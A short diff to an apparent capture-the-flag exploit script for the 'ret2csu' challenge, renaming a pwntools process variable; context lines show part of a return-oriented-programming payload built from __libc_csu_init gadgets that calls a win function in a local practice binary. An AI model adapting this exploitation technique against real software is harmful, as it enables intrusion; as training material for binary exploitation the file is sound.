@@ -1,6 +1,6 @@
 from pwn import *
 
-p = process('./ret2csu')
+io = process('./ret2csu')
 
 # Gadget 1: Popping register values. __libc_csu_init @ 0x000000000040069a
 #   0x000000000040069a <+90>:    pop    rbx
@@ -39,6 +39,6 @@ payload += mov_rdx_r15
 payload += ret
 payload += win_call
 
-p.sendline(payload)
-p.interactive()
+io.sendline(payload)
+io.interactive()
 
